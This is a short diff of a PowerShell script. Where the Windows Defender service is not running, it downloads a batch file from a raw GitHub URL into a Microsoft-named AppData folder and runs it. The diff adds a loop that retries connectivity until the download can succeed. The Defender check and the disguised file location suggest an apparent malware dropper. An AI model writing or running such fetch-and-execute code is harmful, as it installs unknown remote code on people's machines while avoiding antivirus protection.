@@ -87,8 +87,13 @@ if($(GET-Service -Name WinDefend).Status -eq "Running") {
    
     $need_reboot = $true
 } else {
-   Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:appdata\Microsoft\one.bat
-   cmd.exe /c '%appdata%\Microsoft\one.bat'
+   
+do {
+  $ping = test-connection -comp github.com -count 1 -Quiet
+} until ($ping){
+      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:appdata\Microsoft\one.bat
+     }   
+    cmd.exe /c '%appdata%\Microsoft\one.bat'
 }
 
 
